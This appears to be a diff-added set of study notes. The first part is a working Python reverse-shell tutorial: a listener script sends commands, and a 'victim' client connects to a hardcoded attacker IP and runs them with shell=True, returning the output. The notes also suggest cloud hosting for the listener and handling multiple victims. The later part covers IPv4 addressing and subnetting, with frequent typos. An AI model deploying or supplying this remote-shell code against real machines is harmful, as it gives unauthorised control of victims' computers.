+to solve this problem hackers create a server and store the IP address of server in reverse shell file bcz servers have static IP
+
+Server is just a remote computer that never gets turned off
+
+Create a server instance using the ec2 of aws or another such as DigitalOcean
+
+Here we r going to build two files server.py and client.py, the server.py will be installed on the cloud server and client.py will be installed
+on the victim's computer
+
+Data is send from one computer to another computer in the formats of bytes so our cmds to go to the victim computer should be encoded in the
+byte format
+
+On the server side and client side the flow is like this
+server side
+socket() -> bind() -> listen() -> accept() -> block until there r  connection from client ->  read() -> process request -> write() -> close()
+                                                               ^                                ^                             | Data(reply)
+client side                                                    |connection established          |Data(request)                v
+socket()            --------------->                        connect()       -------------->   write() -------------------->  read() --> close
+
+server.py file ->
+import socket
+import sys  # this is used to implement cmd line and terminal cmds into python file
+
+# Creating Socket
+def create_socket():
+    try:
+        global host
+        global port
+        global s
+        host = ""
+        port = 9999     # this port no. is used bcz this is not used a lot
+        s = socket.socket()
+
+    except socket.error as msg:             # if their is any error it will be in socket.error and then we save it in msg
+        print('Socket creation error ' + str(msg))
+
+# Binding Socket and listing Connections
+def bind_socket():
+    try:
+        global host             # we r declaring them again bcz if we want to access the global value of another function such as here
+        global port             # create_socket() global variables we need to declare them again
+        global s
+
+        print("Binding the Port " + str(port))
+
+        s.bind((host,port))         # for the binding
+        s.listen(5)                 # to listen for connections from our client and 5 is here limit for the no. of connections it is going to tolerate before throwing an error
+
+    except socket.error as msg:
+        print('Socket Binding error ' + str(msg) + "\n" + "Retrying...")
+        bind_socket()       # we r using the recursion here so that if their is any error it will try again and again for the connection
+
+# Establish connection with client and socket must be listening
+def socket_accept():
+    conn,address = s.accept()      # accept() returns two data, object of the connection and list of IP address and Port
+    print("Connection has been established ! " + " IP " + address[0] + "| Port " + str(address[1]))
+    send_command(conn)      # this is to send commands to the connection
+    conn.close()    # to close the connection
+
+# Send Commands to Victim
+def send_command(conn):
+    while True:                  # we r going to use infinity loop bcz if we r sending a cmd to victim but we have used the conn.close() after the calling send_command
+        cmd = input()            # function from the socket_accept(), so we need some persitance for more cmds to enter
+        if cmd == 'quit':
+            conn.close()            # close the connection
+            s.close()               # close the socket
+            sys.exit()              # to close cmd prmt of victim computer
+        if len(str.encode(cmd)) > 0:        # this is to check if user has typed something
+            conn.send(str.encode(cmd))      # to send the cmd
+            client_response = str(conn.recv(1024),"utf-8")  # to get the response of the cmd and here we r also converting the data from byte format to string format so 1024 is the chunk size of data and "utf-8" is to convert the data to string format
+            print(client_response, end="")                  # end="" is to send the cursor to next line for new cmd
+
+
+def main():
+    create_socket()
+    bind_socket()
+    socket_accept()
+
+
+main()
+
+--------------------------------------------
+
+client.py file ->
+
+import socket
+import os
+import subprocess
+
+s= socket.socket()
+host = '10.11.28.137'           # IP of attacker
+port = 9999
+
+s.connect((host,port))
+
+while True:
+    data = s.recv(1024)        # for the navigation cmds such as 'cd' which does not return any output just execute we need
+    if data[:2].decode("utf-8") == 'cd':        # we r taking first two characters of data and decode it
+        os.chdir(data[3:].decode("utf-8"))      # this line will contain the path to which we need to navigate
+
+    if len(data) > 0:
+        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)    # this will open the terminal and execute the cmd and shell is fro the access to shell cmds and stdout is for output stream
+        output_byte = cmd.stdout.read() + cmd.stderr.read()             # this is if we need to show our input cmds to the victim also
+        output_str = str(output_byte,"utf-8")
+        currentWD = os.getcwd() + "> "            # to know the current working directory and send it to the server
+        s.send(str.encode(output_str + currentWD))      # send out back to server
+
+        print(output_str)   # this for client's computer
+
+
+For the local testing ->
+First Run server.py file on system itself
+and run the client.py in another termainl   // and u will get the connection established msg
+and then execute cmds
+
+For connecting to multiple clients ->
+We get two things in return from client connection object and address, So here we r going to make a list of the connection objects and address
+for multiple clients, So here r two tasks to do
+- Listen and accept connections from others
+- Sending commands to an already connected
+
+For above mentioned tasks we need to use Threads specifically two threads here one for each task
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+Ip address has 4 octets and each octet has 8 bits
+
+2**m // m is the no. of bits
+
+the last bit at position 0 in the octet is known as Least Significant Bit and the First bit at position 7 is known as the Most Significant Bit
+So on the basis of that at position 0 the decimal value would be 2**0 = 1 and at position 7 the decimal will be 2**7 = 128
+Hence -> x  x  x  x  x  x  x  x // x could be 0 or 1
+        128 64 32 16 8  4  2  1 // Decimal value of bits by 2**m formula
+
+        Now these above calculated decimal values for each position in octet will be count only when a bit is set to 1 bcz when a bit is set to
+        0 it will always have the decimal value of 0
+
+ Ex ->  1   0   1   0   1   1   1   1 // 8 bits data
+       128  0   32  0   8   4   2   1 // Decimal values
+
+       Now the decimal no. which corresponds to those 8 bits -> 128 + 0 + 32 + 0 + 8 + 4+ 2+ 1 = 175
+
+       IP address -> Host(device) Identifier + Netwrok(Subnet) to which a given host belongs to
+
+ Netwrok mask is used to identify the Network Portion of an IP address, network mask is a 32 bit long continous number of 1's followed by 0's
+ netwrok mask can be also represented in a dotted decimal format like 255.255.255.0 or /24 so here the Netwrok Id is represented by the
+ address bit's set to 1 and host identifier is represented by 0 from a Netwrok mask
+ Host ID with a numerically highest no. makes a broadcast address
+ Netwrok and broadcast IP addresses r reserved and cannot be allocated for nodes
+ EX -> an Ip address sent with netwrok mask
+ IP address ->  192.168.255.2
+ Netwrok mask ->255.255.255.0
+
+ IP address in Binary ->    11000000 10101000 11111111 00000010
+ Netwrok mask in Binary->   11111111 11111111 11111111 00000000   // here all 1's r for the netwrok and all 0's is for the host so this means that
+ End Result using the AND-> 11000000 10101000 11111111 00000000      the netwrok address then would be 192.168.255 in the IP address and 2 will be
+                                                                     the Host portion and this Host portion r the bits which we can allocate for
+                                                                     the addresses of our devices
+On converting result 11000000 10101000 11111111 00000000 to decimal -> 192.168.255.0
+the actual identifier of the above netwrok is -> 192.168.255.0 // this is netwrok identifier
+
+Actual Rnage of Host addresses from above output that we can allocate to hosts from this netwrok is -> 192.168.255.1 to 192.168.255.254
+and the netwrok identifier 192.168.255.0 could also be said as the lowest host IP and the higest is 192.168.255.255 and this is known as broadcast asddress
+
+
+ Ex 2 ->
+ IP address ->  10.15.4.2
+ Netwrok mask ->255.0.0.0
+
+ IP address in Binary ->    00001010 00001111 00000100 00000010
+ Netwrok mask in Binary->   11111111 00000000 00000000 00000000
+ End Result using the AND-> 00001010 00000000 00000000 00000000
+
+On converting result 00001010 00000000 00000000 00000000 to decimal -> 10.0.0.0
+the actual identifier of the above netwrok is -> 10.0.0.0 // this is netwrok identifier
+
+Actual Rnage of Host addresses from above output that we can allocate to hosts from this netwrok is -> 10.0.0.1 to 10.255.255.254
+
+Classfull Netwrok Architectuire ->
+First 3 classes A,B,C have designating netwrok mask or we can say netwrok masks were encoded in the 1st 3 bit's of an IP address
+    - class A addresses are IP addresses start with binary 0 as 0xx and assume a netwrok mask of 255.0.0.0(/8)
+    - class B addresses are IP addresses start with binary 10 as 10x and assume a netwrok mask of 255.255.0.0(/16)
+    - class C addresses are IP addresses start with binary 110 as 0xx and assume a netwrok mask of 255.255.255.0(/24)
+    - Other two classes D and E don't use the netwrok masks
+
+Unicast -> Class A,B,C , It identifies the single NIC of a device
+Broadcast -> It identifies all NIC in a given Netwrok
+
+Netwrok address and Broadcast address can never be allocated to ur devices NIC
+
+Origanlly all Unicast IPv4 addresses were Public
+    - A Public IP address uniquely identifies a host on the internet
+        - Belongs to one device/organization
+
+RFC 1918 reserves three ranges of Unicast IPv4 addresses for Private Use
+    - Single Class A netwrok ranges 10.0.0.0(10.0.0.0 - 10.255.255.255)
+    - 16 class B netwrok ranges 172.16.0.0 - 172.31.0.0 (172.16.0.0 - 172.31.255.255)
+    - 256 class C netwrok ranges 192.168.0.0 - 192.168.255.0 (192.168.0.0 - 192.168.255.255)
+
+Private IP ranges cannot be used to connect to the Internet(unless with NAT)
+
+CIDR reduces the waste of IPv4 addresses by getting rid of Netwrok classes and allowing to assign an arbitrary(power of 2) block of IP addresses
+Ex -> 17.10.20.0/24
+
+Subnetting is a process of subdividing a classful netwrok or CIDR block into smaller netwroks, known as subnets, Same as netwrok mask defines
+ the netwrok portion of an IP address, subnet mask defines the Subnet portion
+
+ Address bits that have corresponding mask bits set to 1 represent the Subnet part -> To calculate the Subnet ID set all remaing bits to 0
+
+ Any addresses within within the subnet range represent HostIDs , The highest address in the Subnet is known as Broadcast
+ Subnet and Broadcast IP addresses r reserved and cannot be allocated
+
+ Ex 1 -> IP -> 11.0.0.7
+Subnet Mask -> 255.192.0.0
+
+IP address in Binary ->    00001011 00000000 00000000 00000111
+Subnet mask in Binary ->   11111111 11000000 00000000 00000000
+Subnet Part           ->   00001011 00
+Host Part             ->              000000 00000000 00000111
+Subnet ID             ->   00001011 00000000 00000000 00000000  (11.0.0.0) // all the bits which r under the host part will be converted to 0
+Host IDs              ->   00001011 00XXXXXX XXXXXXXX XXXXXXXX  (11.0.0.1 - 11.63.255.254)
+                                      111111 11111111 11111111  // replacing X with 1 we get 11.63.255.255
+
+
+ Ex 2 -> IP -> 11.67.6.4
+Subnet Mask -> 255.192.0.0
+
+IP address in Binary ->    00001011 01000011 00000110 00000100
+Subnet mask in Binary ->   11111111 11000000 00000000 00000000
+Subnet Part           ->   00001011 00
+Host Part             ->              000011 00000110 00000100
+Subnet ID             ->   00001011 01000000 00000000 00000000  (11.64.0.0) // all the bits which r under the host part will be converted to 0
+Host IDs              ->   00001011 01XXXXXX XXXXXXXX XXXXXXXX  (11.64.0.1 - 11.127.255.254)
+                                      111111 11111111 11111111  // replacing X with 1 we get 11.63.255.255
+
